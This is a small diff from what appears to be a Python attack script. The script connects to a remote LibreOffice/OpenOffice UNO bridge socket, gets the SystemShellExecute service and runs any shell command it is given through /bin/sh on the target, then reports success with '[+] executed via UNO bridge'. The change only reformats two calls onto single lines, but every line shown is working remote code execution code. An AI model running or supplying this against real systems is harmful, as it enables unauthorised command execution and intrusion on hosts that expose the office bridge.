@@ -25,12 +25,8 @@ def main() -> None:
 
     local = uno.getComponentContext()
     resolver = local.ServiceManager.createInstanceWithContext("com.sun.star.bridge.UnoUrlResolver", local)
-    context = resolver.resolve(
-        f"uno:socket,host={args.host},port={args.port};urp;StarOffice.ComponentContext"
-    )
-    executor = context.ServiceManager.createInstanceWithContext(
-        "com.sun.star.system.SystemShellExecute", context
-    )
+    context = resolver.resolve(f"uno:socket,host={args.host},port={args.port};urp;StarOffice.ComponentContext")
+    executor = context.ServiceManager.createInstanceWithContext("com.sun.star.system.SystemShellExecute", context)
     executor.execute("/bin/sh", f"-c {args.command}", 1)
     print(f"[+] executed via UNO bridge {args.host}:{args.port}: {args.command}")
 
